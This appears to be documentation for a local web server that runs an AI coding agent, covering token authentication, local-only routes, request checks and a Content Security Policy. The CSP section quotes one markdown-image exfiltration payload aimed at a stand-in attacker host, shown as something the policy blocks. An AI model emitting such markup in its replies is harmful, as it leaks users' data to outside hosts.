---
title: The server and its security
summary: The local omp-webui server: its data folder, the access token, the address it listens on, which routes are for this computer only, the environment variables it reads, the request checks and Content Security Policy, the Commands & terminal page, the Host tab, and the running omp processes.
settings: config, running
---

# The server and its security

## What it does

`omp-webui-server` runs on the computer that runs omp. It starts and talks to each conversation's `omp` process, reads omp's session files, serves the page and its API, and holds a WebSocket per page. The macOS app starts it for itself; the web version is started by hand and prints its address.

**Data folder.** `~/.omp-webui` (or `OMP_WEBUI_DATA_DIR`; the macOS app uses its own folder in Application Support). It holds the access token, the search index (the text of every conversation), archived conversations, favourite models, the synced interface preferences (`ui-prefs.json`), `guard.json`, `remote.json`, `mode.json`, `omp.json`, the list of other Macs, update and migration working files. The folder is kept mode 0700 and what the server writes into it 0600. The server writes no file of its own inside omp's agent directory (`~/.omp/agent`, or `PI_CODING_AGENT_DIR`); it changes omp's settings through omp's own commands.

**Access token.** The API and the WebSocket require a per-install token, even on the loopback, because omp runs tools on this machine. At start the server prints `Open: http://127.0.0.1:7878/?token=…`; opening that link stores the token in an HttpOnly, `SameSite=Strict` cookie (`ompw_token`, kept 400 days; `Secure` through the tunnel) and strips it from the URL. The token can also be pasted on the unlock screen (`POST /api/auth`) or sent as an `x-omp-webui-token` header. It is kept in `token` in the data folder (mode 0600; an empty file counts as missing and a new token is made). `OMP_WEBUI_TOKEN` chooses it; `OMP_WEBUI_AUTH=off` disables it. The macOS app signs in with its own token and never shows it. A page that came through the tunnel never uses the token itself: it is let in by Cloudflare Access and given the cookie (see the remote-access topic).

**Listening address.** `OMP_WEBUI_HOST` (default `127.0.0.1`) and `OMP_WEBUI_PORT` (default `7878`). Set to a network address of this computer (for example `192.168.1.5`), the server serves that network (with the token) and also listens on `127.0.0.1` on the same port (or the next free one), which is the page for this computer. Pages on the network get what a remote page gets.

**This computer vs. elsewhere.** A request is from *this computer* only when its connection comes from the loopback (`127.0.0.0/8` or `::1`), it names the server by a loopback `Host` (`127.0.0.1`, `localhost`, `[::1]`), and it carries none of the headers a proxy adds (`cf-*`, `x-forwarded-*`, `forwarded`, `via`, `x-real-ip`, `cdn-loop`). Anything else — the tunnel, a network address, a proxy on this machine that adds those headers — is a remote page, whatever token it holds. The **local-only** routes (`/api/remote`, `/api/macs`, `/api/guard`, `/api/update`, `/api/migrate`, `/api/memory`, `/api/shell`, and every route under them) are refused (403) to any remote page. Remote pages are also not given some things inside token routes (for example the Guard card, opening files on this computer, changing keep-awake, changing model-guidance templates).

**Request checks.** Every request must name the server by a loopback name or the configured `OMP_WEBUI_HOST` address (no DNS rebinding), with an `Origin`, when present, equal to its `Host` including the port; API and WebSocket requests must not come from another site (`Sec-Fetch-Site`); every non-GET API request must carry the header `x-omp-webui: 1`; the token is checked for every API request ("Unauthorized: open the link printed by the server", 401).

**Content Security Policy.** Every page is served with a policy confining it to its own origin: images only from the server, `data:` and `blob:`; connections only back to the server (HTTP and WebSocket); scripts only the page's own files plus the one inline script by its hash; no plugins, no framing. A model's reply rendering `![x](https://attacker/?d=…)` therefore fetches nothing.

**Commands & terminal page** (sidebar *Commands & terminal*). It lists omp's CLI commands and flags, discovered at run time from `omp --help` and `omp <command> --help` (so new omp commands appear by themselves), with a filter, each command's help, an **Arguments & flags** form and **Run any command line**. Commands run in a real pseudo-terminal on this computer (interactive ones too), streamed over the WebSocket. Settings › App & system › **omp configuration** opens `omp config`, `omp models`, `omp plugin`, `omp login` or `omp update` there; changes apply to new sessions.

**Host load.** The server samples the computer's CPU, GPU (macOS, through IOKit) and memory (with memory pressure where the system reports it): every 2 s while a page shows the graphs, every 10 s otherwise. It keeps the last hour (one point per sample) and the last day (one point per minute), in memory only. The sidebar shows a line of figures; its popover and the side panel's **Host** tab show tiles and graphs (1 h / 24 h) and per-process figures.

**Running sessions.** Settings › App & system › **Running sessions** lists the omp processes the server has open: each conversation's name (or "new session"), its state (working, open in a tab, idle · closes after 15 min, paused · stays when you quit, waiting for the quota to reset; the Accounts helper is marked as not a conversation), its pid and a **Close** button that ends that process. Under it: omp version, web UI version, agent dir and sessions dir.

## Where it is

- **Settings › App & system › omp configuration** (`#/settings/app`): buttons `omp config`, `omp models`, `omp plugin`, `omp login`, `omp update` (open the Commands & terminal page on that command).
- **Settings › App & system › Running sessions**, then the versions and directories.
- Sidebar / rail **Commands & terminal** (`cli`).
- The sidebar's host load line, its popover, and the side panel's **Host** tab.
- The unlock screen, when a page has no token.

## Settings

None stored by the app for these cards. Environment variables the server reads:

| Variable | Default | Effect |
|---|---|---|
| `OMP_WEBUI_PORT` | `7878` | HTTP port. |
| `OMP_WEBUI_HOST` | `127.0.0.1` | Address to listen on; a network address also listens on `127.0.0.1`. |
| `OMP_WEBUI_DATA_DIR` | `~/.omp-webui` | Data folder. |
| `OMP_WEBUI_TOKEN` | generated, kept in `token` | Choose the access token. |
| `OMP_WEBUI_AUTH` | on | `off` disables the token (not recommended). |
| `OMP_BIN` | `omp` | The omp executable. |
| `PI_CODING_AGENT_DIR` | `~/.omp/agent` | omp's agent directory (sessions are read from its `sessions/`). |
| `OMP_WEBUI_UPDATE_CHECK` | on | `off`: no automatic look-ups for newer omp or app releases. |
| `OMP_WEBUI_UPDATE_INTERVAL_MS` | 6 hours | How often omp releases are looked up. |
| `OMP_WEBUI_AUTO_TITLE` | on | `off`: never ask omp to title a conversation. |
| `OMP_WEBUI_FAMILY_DEADLINE_MS` | `60000` | Time limit to read one conversation for the page before answering 503. |
| `OMP_WEBUI_HOST_LIVE_MS` / `OMP_WEBUI_HOST_BACKGROUND_MS` | `2000` / `10000` | Host load sampling paces (minimum 250 / 1000). |
| `OMP_WEBUI_HOST_GPU` | on | `0`: never read the GPU; `1`: try again after a start whose first GPU read did not finish. |
| `OMP_WEBUI_REMOTE_CONFIG`, `OMP_WEBUI_GUARD_CONFIG` | in the data folder | Other paths for `remote.json`, `guard.json`. |
| `OMP_WEBUI_CLOUDFLARED`, `OMP_WEBUI_BREW` | found on `PATH` | The `cloudflared` / `brew` to run. |
| `OMP_WEBUI_LOGIN_SHELL`, `OMP_WEBUI_DIST`, `OMP_WEBUI_AUTO_PORT`, `OMP_WEBUI_PARENT_PID`, `OMP_WEBUI_APP_BUNDLE` | set by the macOS app | Login shell to take the environment from, built page location, take the next free port, the app's pid (the server exits with it), the app bundle (for self-update). |

## API routes

| Route | Methods | Access | Purpose |
|---|---|---|---|
| `/api/auth` | POST | token; not through the tunnel (403) | Body `{ token }`: exchange the token for the cookie (`{ ok: true }` with `Set-Cookie`), 401 if wrong. Used by the unlock screen. |
| `/api/meta` | GET | token | `{ ompVersion, serverVersion, agentDir, sessionsDir, home, user, remote, local, fileTransfer, shell, macs, questions, keepAwakeAvailable }`: whether this page is remote or on this computer, what it may do with files and terminals, the saved Macs, open questions, whether keep-awake is available. |
| `/api/diagnostics` | GET | token | `{ os, mode }`: the OS description and the current Full / Light mode (for the Feedback report's optional diagnostics). |
| `/api/cli` | GET | token | omp's CLI inventory: `{ version, commands, flags }` parsed from `omp --help` (cached 5 minutes). |
| `/api/cli/help` | GET | token | Query `cmd=<command>` (one or two words): `{ command, description, usage, args, flags, subcommands, raw }` from `omp <command> --help`. |
| `/api/host` | GET | token | Host load history: `{ info, now, fine, coarse, procs }` (machine info and paces, the last hour, the last day, per-process figures while a page asks for them). Live updates come over the WebSocket. |

## Limits and caveats

- The host load history is kept in memory only: a restarted server starts it again.
- Idle omp processes close after 15 minutes; paused ones stay frozen when the app quits.
- A forwarder that adds no proxy headers (`ssh -L`, `socat`, a default nginx `proxy_pass`) reaches the server as a loopback connection and counts as this computer; the token is still required.
- `OMP_WEBUI_AUTH=off` lets any local process or user drive omp.

## Security notes

- The token lets a page use the conversations; it never lets a remote page reconfigure, replace or carry away this computer: the local-only routes are decided by the connection, not by the token or the bind address.
- The token is not shown to remote pages, and the token link and `/api/auth` are refused through the tunnel.
- The data folder holds the token and the text of every conversation; it is private to the user (0700 / 0600).
- The Content Security Policy blocks a model's reply from making the page contact other sites.
- A terminal opened from a remote page (the Terminal tab, `omp shell`) is allowed only as remote access's settings allow.
- Agents must never print, copy or send the access token, and must not change `OMP_WEBUI_HOST` or `OMP_WEBUI_AUTH` unless the user asks.
